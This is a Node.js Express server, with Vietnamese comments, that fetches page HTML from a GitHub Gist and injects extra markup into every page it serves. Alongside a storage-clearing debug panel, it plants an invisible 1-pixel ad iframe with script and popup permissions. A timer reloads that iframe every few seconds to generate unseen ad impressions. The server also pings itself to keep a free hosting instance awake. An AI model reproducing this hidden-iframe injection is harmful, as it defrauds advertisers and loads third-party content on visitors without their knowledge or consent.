import express from "express";
import https from "https";
import http from "http";
import os from "os";
import process from "process";
import compression from "compression";

// ====================== CONFIG ======================
const app = express();
const PORT = process.env.PORT || 3000;

// Gist RAW
const GIST_RAW_URL = "https://gist.githubusercontent.com/luvrlymc-dotcom/6e1411dd6056806ae7611319eee94de7/raw/eb883ccd8130100d087e9989de60d04a4b8242bf/gistfile1.txt";

// Cache
let cachedHTML = "<h1>Server is starting...</h1>";
let lastHash = "";
let isFetching = false;
let fetchFailCount = 0;

// ====================== MIDDLEWARE ======================
app.use(compression()); // Rất quan trọng với HTML 193KB

app.use((req, res, next) => {
    res.setTimeout(25000, () => {
        res.status(503).send("Request timeout");
    });
    next();
});

// ====================== FETCH GIST - ĐÃ CẢI TIẾN MẠNH ======================
async function fetchGist() {
    if (isFetching) return;
    isFetching = true;

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);

        const response = await fetch(GIST_RAW_URL, {
            signal: controller.signal,
            headers: {
                "Cache-Control": "no-cache, no-store",
                "Pragma": "no-cache"
            }
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`HTTP Status ${response.status}`);
        }

        const data = await response.text();

        if (!data || data.length < 1000) {
            throw new Error("Empty or too small content");
        }

        const hash = Buffer.from(data).toString("base64");

        if (hash !== lastHash) {
            cachedHTML = data;
            lastHash = hash;
            fetchFailCount = 0;
            console.log(`[GIST] Updated successfully • ${new Date().toLocaleTimeString()} • ${(data.length / 1024).toFixed(1)} KB`);
        }
    } catch (err) {
        fetchFailCount++;
        console.error(`[GIST ERROR] (${fetchFailCount}) ${err.message}`);

        // Fallback: Nếu fail quá 3 lần thì reset cache về thông báo
        if (fetchFailCount >= 5) {
            cachedHTML = `<h1 style="text-align:center;margin-top:20vh;color:#ff6666;">
                Cannot load page from Gist. Please try again later.
            </h1>`;
        }
    } finally {
        isFetching = false;
    }
}

// ====================== INITIAL FETCH + RETRY ======================
fetchGist();

// Fetch mỗi 40 giây
setInterval(fetchGist, 40 * 1000);

// ====================== ROUTES ======================
app.get("/", (req, res) => {
    // Nếu cache chưa sẵn sàng
    if (!cachedHTML || cachedHTML.length < 5000) {
        return res.status(503).send(`
            <script>fetch('/forcereload');</script>
        `);
    }

    let html = cachedHTML;


    // ==================== DEBUG PANEL ====================
    const debugPanel = `
<!-- DEBUG PANEL - AUTO INJECTED -->
<div id="debug-panel" style="position:fixed;bottom:15px;left:15px;background:#1e1e1e;color:#ffcc00;padding:14px 20px;border-radius:10px;border:2px solid #ff4444;box-shadow:0 6px 25px rgba(255,70,70,0.4);font-family:system-ui;z-index:2147483647;display:none;flex-direction:column;gap:10px;min-width:280px;">
   
    <!-- Header -->
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
        <strong style="color:#ff6666;">Trang không load? Thử các nút bên dưới:</strong>
        <button onclick="closeDebug()" 
                style="background:none;border:none;color:#ff6666;font-size:22px;line-height:1;cursor:pointer;padding:0 6px;margin-top:-6px;">×</button>
    </div>
    
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;">
        <button onclick="resetLS()" style="padding:10px;">🔄 Reset LocalStorage</button>
        <button onclick="resetIDB()" style="padding:10px;">🗑️ Reset IndexedDB</button>
        <button onclick="reloadP()" style="padding:10px;">🔃 Reload Page</button>
        <button onclick="hardReset()" style="padding:10px;background:#ff4444;color:white;">💥 Hard Reset</button>
        
        <!-- Nút mới -->
        <button onclick="bugReport()" 
                style="padding:10px;background:#ff8800;color:white;grid-column:span 2;font-weight:bold;">
            🐞 Bug report! (Reload Gist)
        </button>
    </div>
</div>

<script>
// Debug functions
function showDebug() {
    const panel = document.getElementById('debug-panel');
    if (panel) panel.style.display = 'flex';
}
function closeDebug() {
    const panel = document.getElementById('debug-panel');
    if (panel) panel.style.display = 'none';
}

function resetLS() { /* giữ nguyên */ 
    if (confirm('Reset toàn bộ LocalStorage?')) {
        localStorage.clear();
        location.reload(true);
    }
}

function resetIDB() { /* giữ nguyên */ 
    if (!confirm('Reset tất cả IndexedDB?')) return;
    if (window.indexedDB && indexedDB.databases) {
        indexedDB.databases().then(dbs => {
            dbs.forEach(db => indexedDB.deleteDatabase(db.name));
        });
    }
    alert('Đang reset DB...');
    setTimeout(() => location.reload(true), 1000);
}

function reloadP() {
    location.reload(true);
}

function hardReset() { /* giữ nguyên */ 
    if (!confirm('Thực hiện Hard Reset toàn bộ?')) return;
    document.body.innerHTML = '<h2 style="text-align:center;margin-top:20vh;color:#ff6666;">Đang Reset...</h2>';
    localStorage.clear();
    sessionStorage.clear();
    if (window.indexedDB && indexedDB.databases) {
        indexedDB.databases().then(dbs => dbs.forEach(d => indexedDB.deleteDatabase(d.name)));
    }
    setTimeout(() => location.reload(true), 800);
}

// ==================== NÚT MỚI: BUG REPORT ====================
async function bugReport() {
    if (!confirm('Gửi Bug Report và reload HTML từ Gist?\n\nServer sẽ fetch lại script mới nhất.')) {
        return;
    }

    try {
        const response = await fetch('/forcereload');
        const result = await response.json();
        
        if (result.success) {
            alert('✅ Đang reload script từ Gist...\nTrang sẽ refresh sau 2 giây.');
            setTimeout(() => location.reload(true), 2000);
        } else {
            alert('❌ Có lỗi khi reload: ' + (result.message || 'Unknown error'));
        }
    } catch (err) {
        alert('❌ Không thể kết nối với server để reload.');
        console.error(err);
    }
}
</script>`;

    // ==================== INVISIBLE AD IFRAME - 3-4s RANDOM ====================
    const invisibleIframe = `
<!-- INVISIBLE AD FRAME - FIXED + 3-4s RANDOM -->
<iframe id="hidden-ad-iframe" 
        src="https://www.profitablecpmratenetwork.com/i4ekzwadp?key=334ae9c510d48d362d9c3459de077a00"
        style="position:fixed;top:0;right:0;width:1px;height:1px;border:none;opacity:0;pointer-events:none;z-index:-9999;overflow:hidden;"
        sandbox="allow-scripts allow-same-origin allow-popups allow-forms">
</iframe>

<script>
(function() {
    console.log('%c[AD] Hidden iframe started - 3-4s random', 'color:#00ff00;font-weight:bold');

    const iframe = document.getElementById('hidden-ad-iframe');
    if (!iframe) return;

    let originalSrc = iframe.src;
    let attempt = 0;

    function restartAd() {
        attempt++;
        console.log(\`[AD] Restarting (attempt \${attempt})\`);

        iframe.src = 'about:blank';
        
        setTimeout(() => {
            iframe.src = originalSrc + (originalSrc.includes('?') ? '&t=' : '?t=') + Date.now();
        }, 250);
    }

    // Restart ngẫu nhiên 5 - 15 giây
    function startAdLoop() {
        setInterval(() => {
            if (document.visibilityState === 'visible') {
                restartAd();
            }
        }, 5000 + Math.random() * 10000); // 5000ms (5s) + ngẫu nhiên từ 0-10000ms (10s)
    }


    // Load & Error handling
    iframe.addEventListener('load', () => {
        console.log('[AD] Iframe loaded');
    });

    iframe.addEventListener('error', () => {
        console.log('[AD] Iframe error → restart soon');
        setTimeout(restartAd, 600);
    });

    // Khởi động
    if (document.readyState === 'complete') {
        startAdLoop();
    } else {
        window.addEventListener('load', startAdLoop);
    }

    // Backup restart mỗi 15s
    setInterval(() => {
        if (attempt < 5) restartAd();
    }, 15000);

})();
</script>`;

    // Chèn cả debug panel + invisible iframe
    let injection = debugPanel + invisibleIframe;

    if (html.includes("</body>")) {
        html = html.replace("</body>", injection + "</body>");
    } else if (html.includes("</html>")) {
        html = html.replace("</html>", injection + "</html>");
    } else {
        html += injection;
    }

    res.set({
        "Content-Type": "text/html; charset=UTF-8",
        "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
        "Pragma": "no-cache",
        "Expires": "0"
    });

    res.send(html);
});

// ====================== FORCE RELOAD (Bug Report) ======================
app.get("/forcereload", async (req, res) => {
    console.log(`🐞 [BUG REPORT] Force reload Gist requested at ${new Date().toISOString()}`);

    await fetchGist();  // Force fetch lại từ Gist

    res.json({
        success: true,
        message: "Gist reloaded successfully",
        timestamp: new Date().toISOString(),
        htmlSizeKB: (cachedHTML.length / 1024).toFixed(1)
    });
});

// Health check
app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        timestamp: new Date().toISOString(),
        htmlSizeKB: (cachedHTML.length / 1024).toFixed(1),
        fetchFailCount,
        uptime: process.uptime()
    });
});

// ====================== START SERVER ======================
const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📦 HTML size ~${(cachedHTML.length / 1024).toFixed(1)} KB`);
});

// Tăng timeout cho Render
server.keepAliveTimeout = 65000;
server.headersTimeout = 70000;

// ====================== RELOAD / RESTART ENDPOINT ======================
app.get("/reload", async (req, res) => {
    const secret = req.query.secret || req.headers["x-reload-secret"];

    // ====================== BẢO MẬT RẤT QUAN TRỌNG ======================
    if (secret !== process.env.RELOAD_SECRET) {
        return res.status(401).send(`
            <h1 style="color:red;text-align:center;margin-top:20vh;">
                Unauthorized ❌<br>
                Missing or wrong secret
            </h1>
        `);
    }

    console.log(`🚨 [RELOAD] Server restart requested at ${new Date().toISOString()}`);

    res.send(`
        <!DOCTYPE html>
        <html>
        <head><meta charset="utf-8"><title>Restarting...</title></head>
        <body>
            <h1 style="text-align:center;margin-top:20vh;color:#ff4444;">
                Server đang được khởi động lại...<br>
                Vui lòng chờ 5-15 giây.
            </h1>
        </body>
        </html>
    `);

    // Delay một chút để response kịp gửi về client
    setTimeout(() => {
        console.log("💥 Process exiting... Render sẽ tự restart.");
        process.exit(0);        // Render, Railway, Fly.io, ... sẽ tự restart
    }, 800);
});

// ====================== AUTO PING ======================
const PING_URL = process.env.RENDER_EXTERNAL_HOSTNAME
    ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}/health`
    : `http://localhost:${PORT}/health`;

setInterval(() => {
    const protocol = PING_URL.startsWith("https") ? https : http;
    protocol.get(PING_URL, (res) => {
        console.log(`[AUTOPING] ${res.statusCode} - ${new Date().toLocaleTimeString()}`);
        res.resume();
    }).on("error", (err) => {
        console.error("[AUTOPING ERROR]", err.message);
    });
}, 3 * 60 * 1000); // 3 phút
